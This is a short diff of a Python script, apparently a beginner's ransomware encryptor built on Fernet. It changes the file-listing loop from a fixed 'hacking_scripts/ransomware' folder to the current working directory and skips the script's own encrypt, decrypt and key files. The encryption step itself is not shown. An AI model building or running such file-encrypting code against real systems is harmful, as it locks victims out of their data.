@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 files = []
 
-for file in os.listdir("/home/magicianhacker/Desktop/hacking_scripts/ransomware"):
+for file in os.listdir():
         if file == "encrypt.py" or file == "decrypt.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):  
